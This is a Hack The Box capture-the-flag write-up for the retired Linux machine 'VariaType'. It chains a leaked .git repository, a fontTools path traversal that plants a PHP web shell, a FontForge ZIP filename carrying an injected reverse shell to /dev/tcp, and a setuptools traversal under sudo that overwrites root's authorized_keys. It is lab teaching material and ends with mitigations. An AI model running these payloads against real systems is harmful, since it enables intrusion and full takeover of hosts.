---
machine: VariaType
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, git-disclosure, fonttools, fontforge, setuptools, cve-2025-47273]
---

# VariaType — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A three-CVE chain across typography tooling. An exposed `.git` leaks internal portal credentials; **CVE-2025-66034** (fontTools varLib) writes a PHP web shell through a `.designspace` with CDATA; **CVE-2024-25082** (FontForge) injects commands through a ZIP filename for a shell as `steve`; and the plugin loader running under `sudo` uses a vulnerable setuptools, **CVE-2025-47273**, to write a key into `/root/.ssh/authorized_keys`.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.variatype.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp  ssh
80/tcp  http
```

```text
git.variatype.htb   -> exposed repository
dev.variatype.htb   -> upload portal (internal)
```

## Foothold: .git and credentials

```bash
wget -r http://git.variatype.htb/.git/
cd git.variatype.htb && git log --all --oneline
git log -p | grep -iE "password|api_key|token"
```

A password in a reverted commit grants access to the font portal (`dev.variatype.htb`).

## 2. CVE-2025-66034: file write with fontTools

Variable-font processing writes to paths derived from the `.designspace`. CDATA smuggles content past the expected XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <sources>
    <source filename="../../../../var/www/html/shell.php" name="x">
      <![CDATA[<?php system($_GET['c']); ?>]]>
    </source>
  </sources>
</designspace>
```

```bash
curl 'http://variatype.htb/shell.php?c=id'
```

Shell as `www-data`.

## 3. CVE-2024-25082: FontForge

The validation flow calls FontForge with the user's ZIP filename:

```bash
filename="x;bash -c 'bash -i >& /dev/tcp/<IP>/4445 0>&1';.zip"
```

The name is interpolated into the shell command and runs as `steve`.

## 4. Root: plugin loader and setuptools

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
```

The script downloads a package with `PackageIndex.download(url, tmpdir)`, and **CVE-2025-47273** lets the name escape the temporary directory:

```bash
python3 -m http.server 8000     # serving ../../../root/.ssh/authorized_keys
sudo /usr/bin/python3 /opt/plugin_loader.py http://<IP>:8000/wheel
ssh -i id_ed25519 root@<IP>
```

## Evidence (redacted)

```text
/home/steve/user.txt  -> <user_flag>
/root/root.txt        -> <root_flag>
```

## Lessons

- An exposed `.git` is still gold: history keeps secrets nobody removed from the tree.
- CDATA/XML injection in font tooling (fontTools, FontForge) is the new SSTI frontier.
- `setuptools` historically trusted remote filenames; any script downloading packages is a traversal sink.
- Mitigation: `.git` outside the webroot, patched fontTools/FontForge/setuptools, and `sudo` without wildcards in arguments.
